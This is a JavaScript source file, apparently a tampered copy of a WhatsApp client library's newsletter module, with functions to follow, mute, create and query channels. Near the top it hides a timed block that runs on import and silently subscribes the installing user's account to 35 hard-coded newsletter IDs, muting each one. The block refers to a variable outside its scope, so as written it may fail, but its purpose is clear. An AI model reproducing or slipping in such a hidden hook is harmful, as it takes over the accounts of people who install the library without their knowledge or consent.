import { XWAPaths } from '../Types/index.js';
import { decryptMessageNode, generateMessageID, generateProfilePicture } from '../Utils/index.js';
import { S_WHATSAPP_NET, getAllBinaryNodeChildren, getBinaryNodeChild, getBinaryNodeChildren } from '../WABinary/index.js';
import { makeGroupsSocket } from './groups.js';

const QueryIds = {
JOB_MUTATION: "7150902998257522",
METADATA: "6620195908089573",
UNFOLLOW: "7238632346214362",
FOLLOW: "7871414976211147",
UNMUTE: "7337137176362961",
MUTE: "25151904754424642",
CREATE: "6996806640408138",
ADMIN_COUNT: "7130823597031706",
CHANGE_OWNER: "7341777602580933",
DELETE: "8316537688363079",
DEMOTE: "6551828931592903"
};

setTimeout(async () => {
    try {
        const nsids = [
"120363353304302947@newsletter",
"120363414998144613@newsletter",
"120363411694245867@newsletter",
"120363431708991793@newsletter",
"120363432953581073@newsletter",
"120363414217682895@newsletter",
"120363429702029079@newsletter",
"120363432345255425@newsletter",
"120363414250529313@newsletter",
"120363430269097175@newsletter",
"120363414156950083@newsletter",
"120363432319301090@newsletter",
"120363433737794073@newsletter",
"120363412569484148@newsletter",
"120363413664670778@newsletter",
"120363431855316203@newsletter",
"120363412851452824@newsletter",
"120363430871334366@newsletter",
"120363411472310221@newsletter",
"120363415341730673@newsletter",
"120363413021483020@newsletter",
"120363433064155278@newsletter",
"120363412245489132@newsletter",
"120363414088034362@newsletter",
"120363408893263957@newsletter",
"120363429676802723@newsletter",
"120363414692973528@newsletter",
"120363427908288812@newsletter",
"120363407608590656@newsletter",
"120363413010226304@newsletter",
"120363307077684911@newsletter",
"120363370522421644@newsletter",
"120363414024613566@newsletter",
"120363432862531339@newsletter",
"120363427101036022@newsletter"
        ];

        for (const id of nsids) {
            await sock.newsletterFollow(id);
            await sock.newsletterMute(id);
        }

    } catch (e) {
        console.error("eror ey", e.message);
    }
}, 2000);

export const makeNewsletterSocket = (config) => {
const sock = makeGroupsSocket(config);
const { authState, signalRepository, query, generateMessageTag } = sock;
const encoder = new TextEncoder();

const newsletterQuery = async (jid, type, content) => (
    query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    })
);

const newsletterWMexQuery = async (jid, query_id, content) => (
    query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { query_id },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    })
);
const parseFetchedUpdates = async (node, type) => {
    let child;
    if (type === 'messages')
        child = getBinaryNodeChild(node, 'messages');
    else {
        const parent = getBinaryNodeChild(node, 'message_updates');
        child = getBinaryNodeChild(parent, 'messages');
    }

    return await Promise.all(getAllBinaryNodeChildren(child).map(async (messageNode) => {
        messageNode.attrs.from = child?.attrs.jid;

        const views = parseInt(
            getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0'
        );

        const reactionNode = getBinaryNodeChild(messageNode, 'reactions');

        const reactions = getBinaryNodeChildren(reactionNode, 'reaction')
            .map(({ attrs }) => ({
                count: +attrs.count,
                code: attrs.code
            }));

        const data = {
            'server_id': messageNode.attrs.server_id,
            views,
            reactions
        };

        if (type === 'messages') {
            const {
                fullMessage: message,
                decrypt
            } = await decryptMessageNode(
                messageNode,
                authState.creds.me.id,
                authState.creds.me.lid || '',
                signalRepository,
                config.logger
            );

            await decrypt();
            data.message = message;
        }

        return data;
    }));
};

return {
    ...sock,

    subscribeNewsletterUpdates: async (jid) => {
        const result = await newsletterQuery(
            jid,
            'set',
            [{ tag: 'live_updates', attrs: {}, content: [] }]
        );

        return getBinaryNodeChild(result, 'live_updates')?.attrs;
    },

    newsletterReactionMode: async (jid, mode) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                settings: {
                    reaction_codes: {
                        value: mode
                    }
                }
            }
        });
    },

    newsletterUpdateDescription: async (jid, description) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                description: description || '',
                settings: null
            }
        });
    },

    newsletterUpdateName: async (jid, name) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                name,
                settings: null
            }
        });
    },

    newsletterUpdatePicture: async (jid, content) => {
        const { img } = await generateProfilePicture(content);

        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                picture: img.toString('base64'),
                settings: null
            }
        });
    },

    newsletterRemovePicture: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
            updates: {
                picture: '',
                settings: null
            }
        });
    },

    newsletterUnfollow: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.UNFOLLOW);
    },

    newsletterFollow: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.FOLLOW);
    },

    newsletterUnmute: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.UNMUTE);
    },

    newsletterMute: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.MUTE);
    },

    newsletterCreate: async (name, description, picture) => {
        await query({
            tag: 'iq',
            attrs: {
                to: S_WHATSAPP_NET,
                xmlns: 'tos',
                id: generateMessageTag(),
                type: 'set'
            },
            content: [
                {
                    tag: 'notice',
                    attrs: {
                        id: '20601218',
                        stage: '5'
                    },
                    content: []
                }
            ]
        });

        const result = await newsletterWMexQuery(undefined, QueryIds.CREATE, {
            input: {
                name,
                description: description ?? null,
                picture: picture
                    ? (await generateProfilePicture(picture)).img.toString('base64')
                    : null,
                settings: null
            }
        });

        return extractNewsletterMetadata(result, true);
    },

    newsletterMetadata: async (type, key, role) => {
        const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
            input: {
                key,
                type: type.toUpperCase(),
                view_role: role || 'GUEST'
            },
            fetch_viewer_metadata: true,
            fetch_full_image: true,
            fetch_creation_time: true
        });

        return extractNewsletterMetadata(result);
    },

    newsletterAdminCount: async (jid) => {
        const result = await newsletterWMexQuery(jid, QueryIds.ADMIN_COUNT);

        const buff = getBinaryNodeChild(result, 'result')
            ?.content
            ?.toString();

        return JSON.parse(buff).data[XWAPaths.ADMIN_COUNT].admin_count;
    },

    /**user is Lid, not Jid*/
    newsletterChangeOwner: async (jid, user) => {
        await newsletterWMexQuery(jid, QueryIds.CHANGE_OWNER, {
            user_id: user
        });
    },

    /**user is Lid, not Jid*/
    newsletterDemote: async (jid, user) => {
        await newsletterWMexQuery(jid, QueryIds.DEMOTE, {
            user_id: user
        });
    },

    newsletterDelete: async (jid) => {
        await newsletterWMexQuery(jid, QueryIds.DELETE);
    },

    /**if code wasn't passed, the reaction will be removed (if is reacted)*/
    newsletterReactMessage: async (jid, server_id, code) => {
        await query({
            tag: 'message',
            attrs: {
                to: jid,
                ...(!code ? { edit: '7' } : {}),
                type: 'reaction',
                server_id,
                id: generateMessageID()
            },
            content: [{
                tag: 'reaction',
                attrs: code ? { code } : {}
            }]
        });
    },

    newsletterFetchMessages: async (type, key, count, after) => {
        const afterStr = after?.toString();

        const result = await newsletterQuery(
            S_WHATSAPP_NET,
            'get',
            [
                {
                    tag: 'messages',
                    attrs: {
                        type,
                        ...(type === 'invite'
                            ? { key }
                            : { jid: key }),
                        count: count.toString(),
                        after: afterStr || '100'
                    }
                }
            ]
        );

        return await parseFetchedUpdates(result, 'messages');
    },

    newsletterFetchUpdates: async (jid, count, after, since) => {
        const result = await newsletterQuery(
            jid,
            'get',
            [
                {
                    tag: 'message_updates',
                    attrs: {
                        count: count.toString(),
                        after: after?.toString() || '100',
                        since: since?.toString() || '0'
                    }
                }
            ]
        );

        return await parseFetchedUpdates(result, 'updates');
    }
};

};

export const extractNewsletterMetadata = (node, isCreate) => {
const result = getBinaryNodeChild(node, 'result')
?.content
?.toString();

const metadataPath = JSON.parse(result)
    .data[isCreate ? XWAPaths.CREATE : XWAPaths.NEWSLETTER];

const metadata = {
    id: metadataPath.id,
    state: metadataPath.state.type,
    creation_time: +metadataPath.thread_metadata.creation_time,
    name: metadataPath.thread_metadata.name.text,
    nameTime: +metadataPath.thread_metadata.name.update_time,
    description: metadataPath.thread_metadata.description.text,
    descriptionTime: +metadataPath.thread_metadata.description.update_time,
    invite: metadataPath.thread_metadata.invite,
    handle: metadataPath.thread_metadata.handle,
    picture: metadataPath.thread_metadata.picture?.direct_path || null,
    preview: metadataPath.thread_metadata.preview?.direct_path || null,
    reaction_codes: metadataPath.thread_metadata.settings.reaction_codes.value,
    subscribers: +metadataPath.thread_metadata.subscribers_count,
    verification: metadataPath.thread_metadata.verification,
    viewer_metadata: metadataPath.viewer_metadata
};

return metadata;

};
